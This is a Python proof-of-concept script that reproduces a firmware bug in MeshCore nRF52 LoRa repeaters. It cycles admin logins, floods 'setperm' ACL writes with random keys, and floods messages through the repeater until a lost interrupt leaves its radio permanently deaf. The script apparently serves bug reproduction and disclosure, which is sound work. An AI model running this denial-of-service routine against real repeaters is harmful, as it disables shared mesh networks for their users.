#!/usr/bin/env python3
"""
Bug #22 PoC — Permanent Radio Hang from Flash/SPI Conflict (Two-Client)
=======================================================================
Affected: simple_repeater, simple_room_server, simple_sensor (nRF52)

Root cause
----------
On nRF52 (with BLE disabled), flash erase goes through raw NVMC which
halts the CPU for ~85ms per page — no interrupts are serviced.  If the
SX1262 LoRa radio completes a receive during that window, DIO1 fires
but the ISR (`setFlag()`) never runs.  The radio state machine never
gets `STATE_INT_READY`, so the firmware thinks the radio is still
listening. In reality the radio is idle, waiting for a new
`startReceive()` that never comes.  The repeater is **permanently
deaf** — appears alive (serial works) but never receives LoRa again.

Two-client approach
-------------------
Client A (--port-a): Connects to the repeater, logs in repeatedly to
  dirty the ACL and trigger acl.save() 5 seconds later.  Optionally
  floods "setperm" CLI commands to widen the flash I/O window.

Client B (--port-b): Continuously sends messages through the repeater,
  causing it to receive LoRa packets (DIO1 interrupts).  The more
  packets arriving at the repeater during the ~85ms flash halt, the
  higher the chance of a lost interrupt → permanent deaf radio.

When acl.save() fires and the CPU halts for flash erase, any arriving
LoRa packet's DIO1 interrupt is lost → radio permanently deaf.

Key insight: The crash requires packets ARRIVING at the repeater during
the flash halt.  Sending messages through the repeater (B→repeater→A)
ensures the repeater is receiving LoRa traffic during the critical window.

How to use
----------
  pip install meshcore
  # Node A: admin companion.  Node B: traffic generator companion.
  # --dest-a: the repeater's contact name on Node A
  # --dest-b: Node A's contact name on Node B (so B→A routes through repeater)
  python bug22-flash-hang.py \\
      --port-a COM3 --dest-a myrepeater --pwd secret \\
      --port-b COM5 --dest-b nodeA_from_nodeB

  Optional: --flood-saves N  to also trigger N setperm ACL writes
  Optional: --channel 0      to also flood channel messages from client B
"""

import asyncio, argparse, sys, time, os

try:
    from meshcore import MeshCore, EventType
except ImportError:
    sys.exit("meshcore not found – pip install meshcore")

SAVE_DELAY = 5.0  # firmware LAZY_CONTACTS_WRITE_DELAY (seconds)


# ---------------------------------------------------------------------------
# Client B — continuous traffic generator (runs as background coroutine)
# ---------------------------------------------------------------------------
async def traffic_generator(mc_b, contact_b_to_a, channel_idx, stop_event,
                            sent_counter):
    """Continuously send messages FROM Client B TO Client A (routed through
    the repeater), forcing the repeater to receive packets over LoRa.

    When acl.save() halts the CPU for ~85ms and a packet arrives (DIO1),
    the ISR is lost → radio stuck permanently deaf.

    sent_counter: list with single int, incremented on each send so the
    caller can track how many messages were sent.
    """
    seq = 0
    while not stop_event.is_set():
        seq += 1
        try:
            await mc_b.commands.send_msg(
                contact_b_to_a, f"tfc-{seq}", attempt=0
            )
            sent_counter[0] += 1
        except Exception:
            pass
        # ~250ms between sends: the repeater needs time to receive each one.
        # Too fast and they queue/collide; we want distinct DIO1 events.
        await asyncio.sleep(0.25)

        # Channel messages cause broadcast floods — every mesh neighbor
        # receives them, including the repeater.
        if channel_idx is not None:
            try:
                await mc_b.commands.send_chan_msg(
                    channel_idx, f"f-{seq}"
                )
                sent_counter[0] += 1
            except Exception:
                pass
            await asyncio.sleep(0.25)

    print("  [Client B] Traffic generator stopped.")


# ---------------------------------------------------------------------------
# Client A — login/ACL trigger cycle
# ---------------------------------------------------------------------------
async def run_cycle(mc_a, contact_a, pwd, cycle, flood_saves,
                    mc_b, contact_b, channel_idx):
    """Run one login → traffic → detect hang cycle.  Returns True if hang detected.

    Detection strategy (lost-interrupt model):
      1. Login on Client A → dirties ACL → acl.save() fires 5s later
      2. Client B continuously sends messages through the repeater
      3. During acl.save(), CPU halts ~85ms for flash erase.  If a LoRa
         packet arrives (DIO1 interrupt), the ISR is lost, and the radio
         gets stuck permanently deaf.
      4. We detect the hang by keeping traffic flowing and probing the
         repeater WITH traffic still going.  If the repeater went deaf,
         it can't receive our probes either — but crucially, it also
         stops forwarding Client B's traffic.
      5. After the flash window passes, we stop traffic, pause, and
         probe on a quiet radio.  A deaf repeater won't respond.
    """
    print(f"\n{'='*50}")
    print(f"Cycle {cycle}: logging in via Client A ...")
    r = await mc_a.commands.send_login_sync(contact_a, pwd, min_timeout=10)
    if not r or r.type == EventType.ERROR:
        print(f"  Login failed: {r}")
        return False

    t0 = time.monotonic()
    print(f"  Login OK.  acl.save() expected at ~{SAVE_DELAY:.0f}s.")

    # Start Client B traffic AFTER login — congestion during login causes
    # login timeout.
    stop_traffic = asyncio.Event()
    sent_counter = [0]
    print(f"  Starting Client B traffic generator ...")
    traffic_task = asyncio.create_task(
        traffic_generator(mc_b, contact_b, channel_idx, stop_traffic,
                          sent_counter)
    )

    # If --flood-saves is set, hammer "setperm" with random pubkeys
    # to force the repeater to write the ACL to flash repeatedly.
    if flood_saves > 0:
        print(f"  Flooding {flood_saves} setperm commands ...")
        for i in range(flood_saves):
            pub_hex = contact_a.get("public_key", "")
            if pub_hex:
                if i % 2 == 0:
                    key_hex = pub_hex[:64]
                    perm = "3"
                else:
                    key_hex = os.urandom(32).hex()
                    perm = "1"
            else:
                key_hex = os.urandom(32).hex()
                perm = "1"
            try:
                await mc_a.commands.send_cmd(contact_a, f"setperm {key_hex} {perm}")
            except Exception:
                pass
            await asyncio.sleep(0.3)

    # Phase 1: Keep traffic flowing through the acl.save() flash window.
    # The repeater receives Client B's packets → DIO1 interrupts fire.
    # If CPU is halted during flash erase when DIO1 fires → ISR lost →
    # radio permanently deaf.
    flash_window = SAVE_DELAY + 4.0
    if flood_saves > 0:
        flash_window += flood_saves * 0.5
    print(f"  Traffic flowing — waiting {flash_window:.0f}s for flash window "
          f"(acl.save at ~{SAVE_DELAY:.0f}s) ...")
    await asyncio.sleep(flash_window)
    elapsed = time.monotonic() - t0
    print(f"  Flash window passed ({elapsed:.1f}s).  "
          f"Client B sent {sent_counter[0]} packets.")

    # Phase 2: Stop traffic, let radio settle, probe on quiet channel.
    # If the repeater's radio is deaf, it can't hear our probe either.
    print(f"  Stopping traffic — probing repeater on quiet radio ...")
    stop_traffic.set()
    await asyncio.gather(traffic_task, return_exceptions=True)
    await asyncio.sleep(2.0)  # let any in-flight packets drain

    CONSEC_REQUIRED = 3
    consec_timeouts = 0
    hung = False
    for i in range(CONSEC_REQUIRED + 2):
        ts = time.monotonic()
        t = time.monotonic() - t0
        r = None
        try:
            r = await mc_a.commands.req_status_sync(contact_a, timeout=15)
            rtt = (time.monotonic() - ts) * 1000
            ok = r is not None
        except Exception:
            rtt = (time.monotonic() - ts) * 1000
            ok = False

        if ok:
            tag = f"OK (rssi={r.get('last_rssi','?')}, recv={r.get('nb_recv','?')})"
        else:
            tag = "NO RESPONSE (quiet radio)"

        if not ok:
            consec_timeouts += 1
            if consec_timeouts >= CONSEC_REQUIRED:
                note = f"  ** REPEATER DEAF ({consec_timeouts} consecutive) **"
            else:
                note = f"  (fail {consec_timeouts}/{CONSEC_REQUIRED})"
        else:
            if consec_timeouts > 0:
                note = f"  (recovered after {consec_timeouts} fail(s))"
            else:
                note = ""
            consec_timeouts = 0

        print(f"  probe {i+1}  {t:5.1f}s  {rtt:7.0f}ms  {tag}{note}")

        if consec_timeouts >= CONSEC_REQUIRED:
            hung = True
            break

        await asyncio.sleep(2.0)

    if hung:
        print(f"\n*** Cycle {cycle}: Repeater DEAF after acl.save() -- Bug #22 confirmed! ***")
        print(f"    {CONSEC_REQUIRED} consecutive probes failed on a QUIET radio.")
        print("    Likely cause: flash erase during acl.save() halted the CPU")
        print("    for ~85ms.  A LoRa packet (DIO1) arrived during the halt,")
        print("    the ISR was lost, and the radio is now permanently stuck.")
        print("    Device requires button reset to recover.")
        return True

    # Logout so next login dirties the ACL again
    print(f"  Cycle {cycle}: repeater still alive — logging out ...")
    try:
        await mc_a.commands.send_logout(contact_a)
    except Exception:
        pass
    await asyncio.sleep(1.0)
    return False


async def main():
    ap = argparse.ArgumentParser(
        description="Bug #22 flash-hang PoC — two-client approach "
                    "(Client A triggers flash, Client B generates radio traffic)")
    ap.add_argument("--port-a", required=True,
                    help="Serial port for Client A (admin node that logs into repeater)")
    ap.add_argument("--port-b", required=True,
                    help="Serial port for Client B (traffic generator node)")
    ap.add_argument("--baud", type=int, default=115200)
    ap.add_argument("--dest-a", default=None,
                    help="Repeater contact name as seen by Client A")
    ap.add_argument("--dest-b", default=None,
                    help="Client A's contact name as seen by Client B.  "
                         "Messages B→A are routed THROUGH the repeater, "
                         "forcing the repeater to forward (SPI TX).")
    ap.add_argument("--pwd", default=None, help="Repeater admin password")
    ap.add_argument("--flood-saves", type=int, default=0, metavar="N",
                    help="Send N 'setperm' CLI commands per cycle to trigger "
                         "repeated acl.save() flash writes")
    ap.add_argument("--channel", type=int, default=None, metavar="IDX",
                    help="Also flood channel messages from Client B (channel index)")
    ap.add_argument("--list", action="store_true",
                    help="List contacts on both nodes and exit (no attack)")
    ap.add_argument("--advert", action="store_true",
                    help="Send flood adverts from both nodes, wait for discovery, then exit")
    args = ap.parse_args()

    # --list and --advert don't need --dest-a/--dest-b/--pwd
    need_attack_args = not args.list and not args.advert

    # Connect both clients
    print(f"Connecting Client A on {args.port_a} ...")
    mc_a = await MeshCore.create_serial(args.port_a, args.baud)
    if not mc_a:
        sys.exit(f"Client A: connect to {args.port_a} failed")

    print(f"Connecting Client B on {args.port_b} ...")
    mc_b = await MeshCore.create_serial(args.port_b, args.baud)
    if not mc_b:
        await mc_a.disconnect()
        sys.exit(f"Client B: connect to {args.port_b} failed")

    try:
        # --advert: send flood adverts from both nodes
        if args.advert:
            print("\nSending flood adverts from both nodes ...")
            r_a = await mc_a.commands.send_advert(flood=True)
            print(f"  Client A advert: {r_a.type if r_a else 'no response'}")
            r_b = await mc_b.commands.send_advert(flood=True)
            print(f"  Client B advert: {r_b.type if r_b else 'no response'}")
            print("Waiting 10s for adverts to propagate ...")
            await asyncio.sleep(10)
            # Refresh contacts after discovery
            await mc_a.ensure_contacts()
            await mc_b.ensure_contacts()
            print("\nDone. Use --list to see discovered contacts.")
            # Fall through to --list if both flags set
            if not args.list:
                return

        # --list: show contacts on both nodes
        if args.list:
            await mc_a.ensure_contacts()
            await mc_b.ensure_contacts()
            print(f"\n{'='*60}")
            print(f"Client A ({args.port_a}) — {len(mc_a.contacts)} contacts:")
            print(f"{'='*60}")
            for pubkey, c in mc_a.contacts.items():
                name = c.get('adv_name', '(unnamed)')
                ctype = c.get('type', '?')
                path = c.get('out_path_len', '?')
                print(f"  {name:30s}  type={ctype}  path_len={path}  key={pubkey[:16]}...")
            print(f"\n{'='*60}")
            print(f"Client B ({args.port_b}) — {len(mc_b.contacts)} contacts:")
            print(f"{'='*60}")
            for pubkey, c in mc_b.contacts.items():
                name = c.get('adv_name', '(unnamed)')
                ctype = c.get('type', '?')
                path = c.get('out_path_len', '?')
                print(f"  {name:30s}  type={ctype}  path_len={path}  key={pubkey[:16]}...")
            return

        # --- Attack mode: need dest-a, dest-b, pwd ---
        if not args.dest_a or not args.dest_b or not args.pwd:
            ap.error("--dest-a, --dest-b, and --pwd are required for attack mode")

        # Resolve contacts
        await mc_a.ensure_contacts()
        contact_a = mc_a.get_contact_by_name(args.dest_a)
        if not contact_a:
            sys.exit(f"Client A: contact '{args.dest_a}' not found")

        await mc_b.ensure_contacts()
        contact_b_to_a = mc_b.get_contact_by_name(args.dest_b)
        if not contact_b_to_a:
            sys.exit(f"Client B: contact '{args.dest_b}' not found")

        print(f"\nClient A ({args.port_a}) → logs into repeater '{args.dest_a}'")
        print(f"Client B ({args.port_b}) → sends traffic to '{args.dest_b}' (routed through repeater)")
        print("Cycling login/logout on Client A until hang occurs.  Press Ctrl-C to stop.")
        if args.channel is not None:
            print(f"  Client B will also flood channel {args.channel}")
        cycle = 0
        while True:
            cycle += 1
            if await run_cycle(mc_a, contact_a, args.pwd, cycle,
                               args.flood_saves, mc_b, contact_b_to_a,
                               args.channel):
                break
    except KeyboardInterrupt:
        print(f"\nStopped after {cycle} cycles — hang did not occur.")
    finally:
        await mc_a.disconnect()
        await mc_b.disconnect()

if __name__ == "__main__":
    asyncio.run(main())
